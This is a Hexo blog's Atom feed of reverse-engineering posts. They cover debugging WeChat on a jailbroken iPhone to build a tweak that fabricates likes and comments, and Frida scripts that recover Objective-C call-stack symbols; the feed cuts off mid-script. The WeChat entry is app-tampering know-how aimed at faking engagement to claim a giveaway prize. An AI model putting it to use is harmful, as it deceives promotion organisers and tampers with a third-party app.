<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-07-27T07:02:41.266Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-27T07:02:41.266Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-27T19:38:57.226Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件只用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>xia0 ~ $ lldb&quot;xutil&quot; command installed -&gt; xutil&quot;choose&quot; command installed -&gt; choose&quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:]&quot;sbt&quot; command installed -&gt; sbt// 连接到远端(lldb) pcc</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><pre><code>// 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>第二种是由于lldb支持choose命令，可以直接拿到<code>WCFacade</code>对象。既然如此选choose</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程</p><p>其中里面有个很明显的方法</p><p><code>-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="https://github.com/4ch12dy/fkwechatzan">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><ul><li>集赞助手设置界面</li></ul><p>  <img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1361564255775_.pic.jpg?raw=true" alt="1361564255775_.pic"></p><ul><li><p>朋友圈详情界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1341564229215_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li><li><p>赞和评论</p></li></ul><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T13:04:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just 